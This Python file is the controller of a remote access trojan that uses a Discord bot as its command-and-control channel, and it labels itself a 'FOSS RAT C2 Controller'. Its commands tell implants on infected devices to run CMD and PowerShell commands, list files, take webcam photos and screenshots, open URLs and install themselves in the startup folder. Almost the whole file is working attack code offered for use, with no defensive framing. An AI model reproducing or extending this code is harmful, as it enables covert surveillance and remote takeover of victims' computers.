import discord
from discord.ext import commands
import os

# --- Configuration & State ---
TOKEN_PATH = 'token.txt'
AUTHORIZED_USERS = [1153459521251983470]
SERVER_CATEGORY_NAME = "🔴 Live Sessions"
COMMAND_PREFIX = '?'
INSTRUCTION_PREFIX = 'EXEC_CMD:'
active_sessions = {}

# --- Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)

# --- Helpers ---
def load_token():
    if not os.path.exists(TOKEN_PATH): raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f: return f.read().strip()

@bot.event
async def on_ready():
    print(f'C2 Controller logged in as {bot.user}')

@bot.event
async def on_message(message):
    if message.author.id not in AUTHORIZED_USERS: return
    await bot.process_commands(message)

async def dispatch_command(ctx, command: str, friendly_name: str, *args):
    """Helper function to dispatch commands and provide friendly feedback."""
    if ctx.author.id not in active_sessions:
        await ctx.send(f"⚠️ No device selected. Use `{COMMAND_PREFIX}select <device_name>` first.")
        return False
    channel = active_sessions[ctx.author.id]
    await channel.send(f"{INSTRUCTION_PREFIX}{command} {' '.join(args)}")
    await ctx.send(f"✅ Executed command: **{friendly_name}** on **{channel.name}**.")
    return True

# --- Commands ---
# All commands are present and accounted for.

@bot.command(name="help")
async def help_command(ctx):
    """Displays this help message."""
    embed = discord.Embed(title="FOSS RAT C2 Controller Help", color=discord.Color.purple())
    for command in sorted(bot.commands, key=lambda c: c.name):
        if command.name != 'help':
            embed.add_field(name=f"`{COMMAND_PREFIX}{command.name} {command.signature}`", value=command.help, inline=False)
    await ctx.send(embed=embed)

@bot.command(name="list")
async def list_devices(ctx):
    """Lists all currently active devices."""
    category = discord.utils.get(ctx.guild.categories, name=SERVER_CATEGORY_NAME)
    if not category: return await ctx.send(f"❌ Category '{SERVER_CATEGORY_NAME}' not found.")
    online_devices = [f"📁 `{channel.name}`" for channel in category.text_channels]
    if not online_devices: return await ctx.send("No active devices found.")
    embed = discord.Embed(title="Active Devices", description="\n".join(online_devices), color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.command(name="select")
async def select(ctx, device_name: str):
    """Selects a device by name to issue commands to."""
    channel = discord.utils.get(ctx.guild.text_channels, name=device_name.lower())
    if not channel: return await ctx.send(f"❌ Device '{device_name}' not found.")
    active_sessions[ctx.author.id] = channel
    await ctx.send(f"✅ Session started. You are now controlling **{device_name}**.")

@bot.command(name="kill")
async def kill(ctx):
    """Terminates the implant process on the selected device."""
    await dispatch_command(ctx, "kill", "Terminated implant session")

@bot.command(name="runcmd")
async def runcmd(ctx, *, command: str):
    """Executes a standard CMD command on the selected device."""
    await dispatch_command(ctx, "runcmd", f"Ran CMD command `{command}`", command)

@bot.command(name="runpw")
async def runpw(ctx, *, command: str):
    """Executes a PowerShell command on the selected device."""
    await dispatch_command(ctx, "runpw", f"Ran PowerShell command `{command}`", command)

@bot.command(name="explore")
async def explore(ctx, *, path: str = ""):
    """Lists files and folders at a specific path on the device."""
    await dispatch_command(ctx, "explore", f"Explored path `{path or 'current directory'}`", path)

@bot.command(name="irlpicture")
async def irlpicture(ctx):
    """Captures an image from the selected device's webcam."""
    await dispatch_command(ctx, "irlpicture", "Took webcam picture")

@bot.command(name="openwebsite")
async def openwebsite(ctx, url: str):
    """Opens a URL in the default browser on the selected device."""
    await dispatch_command(ctx, "openwebsite", f"Opened URL `{url}`", url)

@bot.command(name="putinstartup")
async def putinstartup(ctx):
    """Adds the implant to the startup folder on the selected device."""
    await dispatch_command(ctx, "putinstartup", "Added implant to startup")

@bot.command(name="shownotification")
async def shownotification(ctx, title: str, *, message: str):
    """Displays a desktop notification on the selected device."""
    await dispatch_command(ctx, "shownotification", f"Showed notification '{title}'", f'"{title}"', message)

@bot.command(name="systemspecs")
async def systemspecs(ctx):
    """Retrieves detailed system specifications from the device."""
    await dispatch_command(ctx, "systemspecs", "Retrieved system specs")

@bot.command(name="takescreenshot")
async def takescreenshot(ctx):
    """Takes a screenshot of the selected device's screen."""
    await dispatch_command(ctx, "takescreenshot", "Took screenshot")

# --- Main Execution ---
if __name__ == "__main__":
    bot.run(load_token())